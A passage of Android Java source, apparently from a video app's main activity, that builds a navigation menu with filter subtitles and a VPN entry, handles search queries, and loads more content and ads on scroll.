                menuItem.setActionView(R.layout.item_view_navigation_two_line);
                ((TextView) menuItem.getActionView().findViewById(R.id.icon)).setCompoundDrawablesWithIntrinsicBounds(filterView.getViewIcon(), 0, 0, 0);
                ((TextView) menuItem.getActionView().findViewById(R.id.title)).setText(filterView.getViewName());
                setFilterMenuItemSubtitle(filterView, menuItem);
            }
        }

        menu.add(Menu.NONE, FAVORITES_ITEM_ID, Menu.NONE, R.string.favorites).setIcon(R.drawable.ic_heart);
        menu.add(Menu.NONE, DOWNLOADS_ITEM_ID, Menu.NONE, R.string.downloads).setIcon(R.drawable.ic_download);
        menu.add(Menu.NONE, SETTINGS_ITEM_ID, Menu.NONE, R.string.settings).setIcon(R.drawable.ic_settings);
        menu.add(Menu.NONE, VPN_ITEM_ID, Menu.NONE, R.string.vpn).setIcon(R.drawable.ic_vpn_option_globe);


    }

    private void setFilterMenuItemSubtitle(@NonNull FilterView filterView, @NonNull MenuItem menuItem) {
        final StringBuilder stringBuilder = new StringBuilder();
        for (IFilterItem item : filterView.getItems()) {
            if (filterView.isChecked(item)) {
                if (stringBuilder.length() > 0) {
                    stringBuilder.append(", ");
                }
                if (item instanceof FilterItemView) {
                    stringBuilder.append(getString(((FilterItemView) item).getViewName()));
                } else {
                    stringBuilder.append(item.getValue());
                }
            }
        }
        ((TextView) menuItem.getActionView().findViewById(R.id.subtitle)).setText(stringBuilder.length() > 0 ? stringBuilder.toString() : "None");
    }

     /*
    * Search
    * */

    private boolean collapseSearchView() {
        if (searchItem != null && searchItem.isActionViewExpanded()) {
            searchItem.collapseActionView();
            return true;
        }
        return false;
    }

    private void loadSearchList(String keywords) {
        if (TextUtils.isEmpty(keywords)) {
            return;
        }
        try {
            keywords = URLEncoder.encode(keywords.replaceAll("\\s+", " ").trim(), "UTF-8");
            contentStatusPresenter.setKeywords(keywords);
        } catch (UnsupportedEncodingException e) {
            Logger.error("loadSearchVideoList: " + e.getMessage());
        }
    }

    private MenuItem.OnActionExpandListener searchExpandListener = new MenuItem.OnActionExpandListener() {

        @Override
        public boolean onMenuItemActionExpand(MenuItem item) {
            drawerLayout.closeDrawer(drawer);
            return true;
        }

        @Override
        public boolean onMenuItemActionCollapse(MenuItem item) {
            contentStatusPresenter.setKeywords(null);
            return true;
        }
    };

    private SearchView.OnQueryTextListener searchListener = new SearchView.OnQueryTextListener() {

        @Override
        public boolean onQueryTextSubmit(String s) {
            loadSearchList(s);
            searchView.clearFocus();
            return true;
        }

        @Override
        public boolean onQueryTextChange(String s) {
            return true;
        }
    };

    /*
    *
    * */

    private final class LoadMoreScrollListener extends RecyclerView.OnScrollListener {

        private boolean canLoadMore = true;

        @Override
        public void onScrolled(RecyclerView recyclerView, int dx, int dy) {
            super.onScrolled(recyclerView, dx, dy);
            if (canLoadMore && dy > 0) {
                final GridLayoutManager manager = (GridLayoutManager) recyclerView.getLayoutManager();
                int spanCount = manager.getSpanCount();
                int totalItemCount = manager.getItemCount();
                int visibleItemPosition = manager.findLastVisibleItemPosition() + 1;
                if (totalItemCount - visibleItemPosition <= spanCount) {
                    canLoadMore = false;
                    contentStatusPresenter.getContent(false);
                }
            }

            MobileAds.initialize(MainActivity.this, "@string/app_id") ;
            mAdView3 = findViewById(R.id.adView3);
            AdRequest adRequest = new AdRequest.Builder().build();
            mAdView3.loadAd(adRequest);
        }

    }
}
